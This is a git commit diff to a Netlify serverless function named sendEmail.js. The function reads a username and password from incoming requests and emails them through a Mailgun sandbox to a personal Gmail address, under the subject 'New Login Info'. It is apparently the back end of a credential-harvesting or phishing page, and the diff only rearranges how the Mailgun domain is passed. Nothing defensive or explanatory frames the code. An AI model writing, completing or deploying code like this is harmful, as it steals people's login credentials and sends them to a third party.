b8bd8742426d858c2bb6d83269f9e60f7a09a4c2
sarah1brown100-netizen <sarah1brown100@gmail.com>
2026-04-03 12:21:46 -0700

    Update sendEmail.js

--- netlify/functions/sendEmail.js
+++ netlify/functions/sendEmail.js
@@ -11,11 +11,9 @@ export async function handler(event) {
 try {
 const { username, password } = JSON.parse(event.body);
 
-const domain = process.env.MAILGUN_DOMAIN; // should be: sandbox6bb4164382f045b9975489c0e3137797.mailgun.org
-
-await mg.messages.create(domain, {
-from: 'Mailgun Sandbox <postmaster@sandbox6bb4164382f045b9975489c0e3137797.mailgun.org>',
-to: 'Anabones716@gmail.com', // must be authorized in Mailgun sandbox
+await mg.messages.create(process.env.MAILGUN_DOMAIN, {
+from: 'Mailgun Sandbox <postmaster@sandbox6bb4164382f045b9975489c0e3137797.mailgun.org>', // literal string!
+to: 'Anabones716@gmail.com', // must be verified in Mailgun sandbox
 subject: 'New Login Info',
 text: `Username: ${username}\nPassword: ${password}`
 });
